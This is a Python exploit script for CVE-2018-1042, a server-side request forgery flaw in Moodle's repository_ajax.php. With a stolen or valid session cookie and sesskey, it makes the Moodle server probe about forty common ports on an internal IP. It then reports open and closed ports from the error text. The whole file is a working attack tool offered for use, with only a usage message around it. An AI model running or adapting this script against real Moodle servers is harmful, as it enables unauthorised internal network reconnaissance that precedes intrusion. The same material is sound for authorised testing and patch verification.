#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Script to exploit CVE-2018-1042 in order to do internal port scans.
#
# by Psycho (@UDPsycho)
#   Twitter: https://www.twitter.com/UDPsycho
#

import sys
import requests


if len(sys.argv) != 6:
    # "repo_id" & "sesskey" parameters are useless but necessary for the attack
    print ("\nUsage:   {} <url> <target_ip> MoodleSession=<value> repo_id=<value> sesskey=<value>".format(sys.argv[0]))
    print ("Example: {} https://example.com/repository/repository_ajax.php?action=signin 127.0.0.1 MoodleSession=XXXXX repo_id=X sesskey=XXXXX\n".format(sys.argv[0]))

else:

  # Required for color output
  RED   = "\033[1;91;40m"
  GREEN = "\033[1;92;40m"
  RESET = "\033[0m"

  # Parse args
  target_url    = sys.argv[1]
  target_ip     = sys.argv[2]
  moodle_cookie = sys.argv[3].split("=")[0]
  moodle_value  = sys.argv[3].split("=")[1]
  repo_id_param = sys.argv[4].split("=")[0]
  repo_id_value = sys.argv[4].split("=")[1]
  sesskey_param = sys.argv[5].split("=")[0]
  sesskey_value = sys.argv[5].split("=")[1]

  # Top ports according to nmap (https://nmap.org/book/port-scanning.html#most-popular-ports)
  top_ports = ("80","23","443","21","22","25","3389","110","445","139",
              "143","53","135","3306","8080","1723","111","995","993","5900",
              "631","161","137","123","138","1434","445","135","67","53",
              "139","500","68","520","1900","4500","514","49152","162","69")

  closed_port_error = "Connection refused"
  open_ports = ""

  # Cookies required to send the request
  cookies = { moodle_cookie : moodle_value }


  print ("\nScanning top ports, please wait...\n")

  for port in top_ports:

    target = target_ip + ":" + port

    try:

      # Data required to exploit the vulnerability
      data = {
        "file"        : target,
        repo_id_param : repo_id_value,
        sesskey_param : sesskey_value
      }

      response = requests.post(target_url, cookies=cookies, data=data, allow_redirects=False)

      if closed_port_error in response.text:
        print ("{}{}\tClosed{}".format(target, RED, RESET))
      else:
        open_ports += (port + " ")
        print ("{}{}\tOpen{}".format(target, GREEN, RESET))

    except requests.ConnectionError:
      open_ports += (port + " ")
      print ("{}{}\tOpen{}".format(target, GREEN, RESET))

  print ("\nPorts {}{}{}seems to be open at {}{}{}!\n"
    .format(GREEN, open_ports, RESET, GREEN, target_ip, RESET))
